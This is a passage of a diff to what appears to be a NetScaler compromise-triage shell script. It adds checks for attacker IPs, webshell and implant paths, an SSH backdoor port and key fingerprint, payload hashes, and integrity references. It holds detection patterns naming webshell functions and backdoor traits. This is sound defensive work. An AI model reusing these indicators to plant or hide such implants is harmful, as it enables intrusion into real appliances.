+    OPP_IPRE="$OPP_IPRE|"'45\.153\.212\.101|46\.233\.40\.20|46\.236\.167\.143|46\.33\.33\.95|49\.150\.197\.119|78\.190\.152\.64|81\.10\.79\.197|95\.105\.74\.172|100\.38\.125\.66|102\.213\.132\.123|102\.222\.146\.45|103\.181\.212\.245|103\.197\.249\.161|103\.83\.146\.100|111\.92\.128\.89|114\.145\.49\.215|120\.244\.160\.182|125\.62\.88\.26|154\.183\.158\.198|154\.241\.254\.9|174\.60\.63\.37|177\.52\.203\.23|183\.63\.88\.227|190\.117\.56\.56|195\.62\.37\.119|207\.48\.184\.10'
     COMP=""; TGT=""; ALLTGT=""
     # v1.11: files the injected commands try to write ("hostname>/path", "fetch -qo /v", "curl -o /path"), read from
     # the injection lines above (${IFS} / {IFS} / %20 turned into spaces). If such a file EXISTS, the command ran.
@@ -1499,6 +1773,29 @@ NetScaler C2 agent file (SOCRadar): $(for x in $F; do echo "$x ($(fmtdate "$(mti
            find /var/netscaler/logon /netscaler/ns_gui /var/netscaler/gui /var/vpn -type f -name '.*.php' 2>/dev/null; } | sort -u)
     [ -n "$F" ] && COMP="$COMP
 implant / dropper / hidden PHP webshell file (Huntback.io): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    # v1.17 Zscaler ThreatLabz (16 Oct): Rust implant saved as /var/kw2s11, and the Nx_<number> fingerprint file (.html) and
+    # PHP / Perl CGI webshells (.php / .pl) written to the Gateway web folders, all printing the marker "Nx-zD|"
+    F=$( { ls -d /var/kw2s11* /tmp/kw2s11* /var/tmp/kw2s11* 2>/dev/null
+           find /var/vpn /netscaler/ns_gui/vpn /netscaler/ns_gui/cgi /var/netscaler/gui /var/netscaler/logon -type f -name 'Nx_[0-9]*' 2>/dev/null
+           find /var/vpn /netscaler/ns_gui/vpn /netscaler/ns_gui/cgi /var/netscaler/gui /var/netscaler/logon -type f -size -2000k 2>/dev/null \
+             | notours | xargs grep -l 'Nx-zD|' 2>/dev/null; } | sort -u)
+    [ -n "$F" ] && COMP="$COMP
+Zscaler implant (/var/kw2s11) or Nx_ webshell / fingerprint file (marker Nx-zD|): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    # watchTowr IoC list (9 Oct): trojanised Dropbear SSH ("walk", static FreeBSD build, fixed password and RSA key),
+    #   dropped by /var/1, listening on tcp/37512. It leaves the normal SSH config alone, so only its files and port show it.
+    F=$(ls -d /var/1 /var/walk /usr/bin/walk /tmp/walk /var/tmp/walk 2>/dev/null)
+    [ -n "$F" ] && COMP="$COMP
+SSH backdoor / dropper file (Dropbear 'walk', watchTowr): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    F=$( { sockstat -46l 2>/dev/null | awk '$6 ~ /:37512$/'
+           ps axww -o pid=,command= 2>/dev/null | grep -E '(^|[[:space:]/])walk([[:space:]]|$)|/var/1([[:space:]]|$)' | grep -vE 'grep|ctx697096'; } | sort -u | cut -c1-160)
+    [ -n "$F" ] && COMP="$COMP
+SSH backdoor running now (listener on tcp/37512 or 'walk' process, watchTowr):
+$F"
+    #   Its fixed key (SHA256:hGLHNG47...) goes into authorized_keys - matched by fingerprint, pure Perl, no ssh-keygen needed
+    F=$(find /root/.ssh /nsconfig/ssh /flash/nsconfig/ssh /nsconfig/.ssh /home/*/.ssh -maxdepth 1 -type f -name 'authorized_keys*' 2>/dev/null \
+        | while read -r x; do perl -MMIME::Base64 -MDigest::SHA=sha256_base64 -ne 'print "$ARGV\n" if /(?:^|\s)(?:ssh-|ecdsa-|sk-)\S+\s+([A-Za-z0-9+\/=]+)/ && sha256_base64(decode_base64($1)) eq "hGLHNG47ISWLin1Ik3o2KzgPLphQ3mjkGdp6DSeAiLo"' "$x" 2>/dev/null; done | sort -u)
+    [ -n "$F" ] && COMP="$COMP
+known attacker SSH key (SHA256:hGLHNG47ISWLin1Ik3o2KzgPLphQ3mjkGdp6DSeAiLo, watchTowr) in: $(echo $F)"
     # .ctxs.receiver webshell (created 24 Sep 06:52 UTC on seen boxes; HA file sync copies it to the peer)
     # + v1.13 (Huntback.io, 4 Oct): the same campaign also drops randomly named *.receiver webshells in LogonPoint/custom
     F=$(find /var/netscaler/logon /netscaler/ns_gui /var/vpn /var/netscaler/gui \( -name '.ctxs*' -o -name '*.receiver' -o -name '*.receiver.*' \) 2>/dev/null | sort -u)
@@ -1528,7 +1825,13 @@ package (.deb) file in the login-page theme folder (SLAPSHOT keeps a webshell as
     #   (from the analysis of its installer b9b0a438..., already listed above)
     GK_HASHES="$GK_HASHES be559fb34104b8ce491082276084e76736f5a5ec6b8d05fe31adc60ec063e447 dc07e82e31f874c386e74bb5882c269a3d33a774a7b9772b11830bf6d33bfc7e"
     GK_HASHES="$GK_HASHES 9f792058552da5cbbb08693694d31a31d360be8402a3c9d41584d34e3b569be7 cd6b7acea0bdbcf8b6e8b2e62ea710ab3d9e59111202ac7a733d109c27c948fd"
-    WS_HASHES="$WS_HASHES $AW_HASHES $DY_HASHES $LB_HASHES $GK_HASHES"
+    # + watchTowr IoC list for CVE-2026-88771 (9 Oct; PR #8, feiglein74): Sliver ns_helper, Perl stager update_c08937.pl, the
+    #   webshell it embeds, the SSH dropper /var/1 and the trojanised Dropbear "walk". Public - kept apart from GK_HASHES
+    #   (Gotham-relayed, see THIRD-PARTY-NOTICE.md).
+    WT_HASHES="6c8929c6bc1ad59c4742d2671b797a08e36b8f3ec6ab479afc08bec62a3c2657 0e9e1a1644c0f445fe20735f6ab56e0ba61c9e51d76c34e14e729a9db9d78bf1"
+    WT_HASHES="$WT_HASHES c0ebf54be0aeddd5b953df8a60bff7fc88d571e948405c24f6b5d6c1aa17558a 6caf647ec5a440739b7ef073ccf30463ace79a17c9195eb528ea826c4c0000c4"
+    WT_HASHES="$WT_HASHES 530fb1522dc0a023bc3412d576c52a553933d302ed445475501acf8e7cfea46b"
+    WS_HASHES="$WS_HASHES $AW_HASHES $DY_HASHES $LB_HASHES $GK_HASHES $WT_HASHES"
     for f in $(find /var/netscaler/logon/LogonPoint/custom /var/vpn /var/netscaler/gui/vpn/scripts /var/netscaler/gui/vpns/scripts /netscaler/ns_gui/vpn/scripts /netscaler/ns_gui/vpn/media -type f -size -2000k 2>/dev/null | hashfiles | hashmatch "$WS_HASHES"); do
       COMP="$COMP
 known webshell/payload SHA-256: $f"
@@ -1536,9 +1839,10 @@ known webshell/payload SHA-256: $f"
     # v1.9: Arctic Wolf payload hashes, also in the places payloads are saved (/tmp, /var/tmp, top of / and /var)
     # v1.12: also the SAML-attack kit folders /nsconfig/.slap and /var/tmp/.ux, and the Gotham-relayed hashes (GK_HASHES)
     for f in $( { find /tmp /var/tmp -maxdepth 3 -type f -size -20000k 2>/dev/null; find / /var -maxdepth 1 -type f -size -20000k 2>/dev/null
-                  find /nsconfig/.slap /flash/nsconfig/.slap -type f -size -20000k 2>/dev/null; } | grep -v ctx697096 | hashfiles | hashmatch "$AW_HASHES $DY_HASHES $LB_HASHES $GK_HASHES"); do
+                  find /nsconfig/.slap /flash/nsconfig/.slap -type f -size -20000k 2>/dev/null
+                  find /nsconfig/.ns_helper /flash/nsconfig/.ns_helper /usr/bin/walk -type f -size -20000k 2>/dev/null; } | grep -v ctx697096 | hashfiles | hashmatch "$AW_HASHES $DY_HASHES $LB_HASHES $GK_HASHES $WT_HASHES"); do
       COMP="$COMP
-known payload SHA-256 (Arctic Wolf / Unit 42 / SAML-attack kit): $f ($(fmtdate "$(mtime "$f")"))"
+known payload SHA-256 (Arctic Wolf / Unit 42 / SAML-attack kit / watchTowr): $f ($(fmtdate "$(mtime "$f")"))"
     done
     # WHIPSHOT (Mandiant): webshell code reading commands from HTTP_X_UX*, or eval/base64 on HTTP_NSC_CLIENTTYPE /
     # HTTP_NSC_LDAP. Not searched in NetScaler's own ns_gui PHP, which uses NSC_ headers legitimately.
@@ -1563,13 +1867,228 @@ webshell key/token strings (Unit 42 .deb webshell): $(echo $F)"
     [ -n "$F" ] && COMP="$COMP
 SLAPSHOT tunnel marker UXD_IDLE_EXIT (Mandiant): $(echo $F | cut -c1-240)"
     # php_flag engine on / SetHandler for PHP in httpd.conf (Beazley, CERT-EU)
-    F=$(grep -nHiE '^[[:space:]]*(php_flag|php_admin_flag)[[:space:]]+engine[[:space:]]+on|^[[:space:]]*SetHandler[[:space:]]+.*php' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null)
+    # v1.17: also "php_engine on" as Zscaler ThreatLabz describes the change (16 Oct)
+    F=$(grep -nHiE '^[[:space:]]*(php_flag|php_admin_flag)[[:space:]]+engine[[:space:]]+on|^[[:space:]]*php_engine[[:space:]]+on|^[[:space:]]*SetHandler[[:space:]]+.*php' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null)
     [ -n "$F" ] && COMP="$COMP
 httpd.conf enables PHP (php_flag engine on / SetHandler php): $F"
+    # v1.17 Zscaler ThreatLabz (16 Oct): the payload appends "AddHandler cgi-script .pl" to /etc/httpd.conf to run its Perl
+    # webshell. [CHECK], not red: compare with httpd.conf of a clean appliance on the same build.
+    F=$(grep -nHiE '^[[:space:]]*AddHandler[[:space:]]+cgi-script[[:space:]].*\.pl' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null)
+    [ -n "$F" ] && { warn "httpd.conf runs .pl files as CGI (AddHandler cgi-script .pl - the change Zscaler saw the payload make); compare with a clean appliance of the same build:"; echo "$F" | show 5; FOLLOWUP=1; }
     # PHP / webshell code where no PHP belongs (catches renamed or modified webshells)
     F=$(find /var/netscaler/logon/LogonPoint/custom /var/vpn -type f 2>/dev/null | xargs grep -lE '<\?php|passthru[[:space:]]*\(|NSC_TASS' 2>/dev/null)
     [ -n "$F" ] && COMP="$COMP
 PHP/webshell code in LogonPoint/custom or /var/vpn: $(echo $F)"
+    # v1.17 file integrity against clean-appliance references from Manuel Winkel's (Deyda) triage script v9.92, used with
+    # his permission. Each comes from ONE clean test appliance, not from Citrix: a difference is a [CHECK], never red.
+    # Standard builds only (FIPS/NDcPP: no reference). Web GUI scripts on 14.1-73.46 (674 .php/.js/.html/.sh files in
+    # /var/netscaler/gui: admin_ui, vpn, vpns, epa - SHA-256 shortened to 16 hex digits), /bin/sh, the fixed
+    # ns_monuploadd_err.pl and customsnmpd. An extra .php in the GUI is what a php2shell / CVE-2026-88771 attacker leaves.
+    RBLD="$REL-$BMAJ.$BMIN"; ISFIPS=0
+    echo "$VERLINE" | grep -qiE 'FIPS|NDcPP' && ISFIPS=1
+    [ "$REL" = 13.1 ] && [ "$BMAJ" = 37 ] && ISFIPS=1
+    INTOK=""; INTN=""
+    refh() { echo "$1" | hashfiles | awk '{print $1}'; }
+    intcmp() { [ -n "$2" ] && [ -f "$1" ] || return 0; _h=$(refh "$1")
+      if [ "$_h" = "$2" ]; then INTOK="$INTOK $1"; else INTN="$INTN
+$1 - SHA-256 ${_h:-unreadable}, size $(wc -c < "$1" 2>/dev/null | tr -d ' ') bytes, changed $(fmtdate "$(mtime "$1")")"; fi; }
+    SHX=""; MUX=""; CSX=""
+    if [ "$ISFIPS" -eq 0 ]; then
+      case "$RBLD" in
+        14.1-73.37) SHX=2c1310d7c4d7dfb1ef47b137be1eb572cc743cc609898ae38320963cc0578665 ;;
+        14.1-73.41) SHX=8c121937b172124e5895e5296dff5227841b1f8d9a698489377b65e3adb309c7 ;;
+        14.1-73.46|13.1-64.24) SHX=6e10647b03ef1e7725ce369e2bc07f1cfa54dec406bc4d85452cd563b4036907 ;;
+      esac
+      case "$RBLD" in 14.1-73.37|14.1-73.46) MUX=02b24a9923a6cee1fbee48137b7f81b7e0f5169246728b7368fc3a066c43a708 ;; esac
+      case "$RBLD" in 14.1-73.37|14.1-73.41|14.1-73.46|13.1-64.24) CSX=1dd0887ff21b18b0eb78a336e76d4dc3bb6f4fc645e9d864414a2958cb1637fe ;; esac
+    fi
+    intcmp /bin/sh "$SHX"
+    # the VULNERABLE helper copy is reported separately above
+    [ "$(refh /netscaler/ns_monuploadd_err.pl 2>/dev/null)" = fb7f574a4c185fa8e520c47280939ce22899243a0083ee7120b7300c43baca29 ] || intcmp /netscaler/ns_monuploadd_err.pl "$MUX"
+    intcmp /var/python/bin/customsnmpd "$CSX"
+    GRES=""
+    if [ "$RBLD" = 14.1-73.46 ] && [ "$ISFIPS" -eq 0 ] && [ -d /var/netscaler/gui ]; then
+      GUIB64='
+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
